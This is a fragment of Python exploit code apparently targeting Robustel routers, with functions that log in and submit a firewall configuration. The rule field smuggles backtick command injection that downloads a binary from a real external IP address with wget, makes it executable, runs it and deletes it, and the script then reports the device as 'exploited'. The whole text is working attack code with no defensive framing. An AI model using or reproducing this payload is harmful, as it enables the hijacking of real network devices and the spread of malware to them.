...
def send_post_login_request(ip_port, cookie_value):
    ...
    data_post_login = {
        "setmsg": "<config_xml><firewall><custom_list><id>1</id><desc>rule1</desc><rule>iptables -A INPUT -s 1.1.1.1 -j ACCEPT`wget http://45.95.146.126/r19 -O juli ``chmod 777 juli``./juli``rm juli`</rule></custom_list></firewall></config_xml>",
...
def send_third_request(ip_port, cookie_value):
    ...
    try:
        ...
        if "OK" in response_third_request.text:
            print(f"[ROBUSTEL] exploited: {ip_port}")
